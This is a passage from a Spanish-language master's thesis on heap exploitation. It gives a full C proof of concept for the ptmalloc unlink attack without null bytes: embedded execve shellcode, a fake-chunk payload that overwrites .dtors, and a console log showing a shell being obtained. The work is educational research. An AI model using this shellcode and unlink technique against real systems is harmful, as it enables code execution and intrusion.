\subsubsection{Construcci�n de la prueba de concepto sin bytes nulos}


Este apartado va a ser mucho menos extenso que el \ref{sec:const_pof}. debido a que el concepto es el mismo con la �nica diferencia que el \textit{payload} ha cambiado. El C�digo \ref{code:ptmalloc_exploit_2} muestra la nueva prueba de concepto. \bigskip

\lstset{language=C, caption=Exploit para el algoritmo ptmalloc sin bytes nulos , label=code:ptmalloc_exploit_2}
\begin{lstlisting}
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define VULN 		"./vuln"
#define PAYLOAD_SIZE	531

void world_destruction() __attribute__((destructor));
void build_payload (char *, void *);

char shellcode[]= 	/* jmp 12 + 12 nops */
			"\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
			/* shellcode by vlan7 and sch3m4 */
			"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9"
			"\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
			"\x69\x8d\x41\x0b\x89\xe3\xcd\x80";

int main(int argc, char ** argv) {
	
	int status;
	char crafted_data[700] = {0};
	
	
	/* Obtain the page size of the system */
	int pagesize = sysconf(_SC_PAGE_SIZE);
	if ( pagesize == -1) {
		perror("[-] Page size could not be obtained");
		exit(EXIT_FAILURE);
	}
	/* Obtain an aligned memory region in order to mprotect it */
	void * real_shell;
	if ( posix_memalign(&real_shell, pagesize, sizeof(shellcode)) ) {
		perror("[+] Aligned memory could not be obtained");
		exit(EXIT_FAILURE);
	}
	/* Copy the shellcode to the executable region obtained with memalign */
	memcpy(real_shell, shellcode, sizeof(shellcode));
	/* Making  shellcode location executable */
	mprotect(real_shell, pagesize, PROT_WRITE | PROT_EXEC);
	/* Making DTORS section writable */
	mprotect((void*)0x8049000, pagesize, PROT_WRITE);
	/* The payload is built */
	build_payload(crafted_data, real_shell);

	
	char * ptr_1 = (char *) malloc (512);
	char * ptr_2 = (char *) malloc (512);

	memcpy(ptr_1, crafted_data, PAYLOAD_SIZE);

	free(ptr_1);
	free(ptr_2);	
	
	return 0;
}

void build_payload(char * crafted_data, void * sc_addr) {

	char str_dtor_ptr[5] = {0};
	char * seek = crafted_data;
	
	/* Trash */
	memset(seek, '@', 492); 
	seek += 492;
	/* Size of the second fake chunk */
	/* if the PREV_INUSE bit is set, the unlink is not triggered */
	/* in the second free()*/
	memcpy(seek, "\x41@@@", 4);
	seek += 4;
	/* prev_size of fake chunk. */
	memcpy(seek, "@@@@", 4);
	seek += 4;
	/* size of fake chunk. PREV_INUSE bit unset. -8 value */
	/* triggers unlink in the nextinuse of the first free() */
	memcpy(seek, "\xf8\xff\xff\xff", 4);
	seek += 4;
	/* fd of fake chunk */
	memcpy(seek, "@@@@", 4);
	seek += 4;
	/* bk of fake chunk */
	memcpy(seek, "@@@@", 4);
	seek += 4;
	/* prev_size of second freed chunk. */
	memcpy(seek, "@@@@", 4);
	seek += 4;
	/* size of second freed chunk. Hexadecimal -16 value */
	/* PREV_INUSE bit set. Avoid consolidate backward (unlink) on 2nd free */
	memcpy(seek, "\xf1\xff\xff\xff", 4);
	seek += 4;
	/* fd of second freed chunk. dtors_end - 12 */
	memcpy(str_dtor_ptr, "\x10\x9f\x04\x08", 4);
	memcpy(seek, str_dtor_ptr, 4);
	seek += 4;
	/* bk of second freed chunk. Shellcode address */	
	memcpy(seek, &sc_addr, 4);
	seek += 4;
}

void world_destruction() {}
\end{lstlisting}

Debido a la complejidad del c�digo o, al menos, del \textit{payload}, �ste est� mucho m�s comentado, detallando el por qu� de cada una de sus partes. Los comentarios son una especie de resumen del apartado anterior. \bigskip

Al ejecutar el c�digo, del mismo modo que con el c�digo anterior, se obtiene una l�nea de comandos: \bigskip

\begin{listing}[style=consola, caption=Ejecuci�n de la prueba de concepto sin bytes nulos, label=out:pof_3]
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ gcc pof_without_null_bytes.c -o pof_without_null_bytes -g
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ ./pof_without_null_bytes 
$ id
uid=1000(newlog) gid=1000(newlog) groups=1000(newlog),4(adm),20(dialout),24(cdrom),46(plugdev),111(lpadmin),119(admin),122(sambashare)
$ exit
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ 
\end{listing}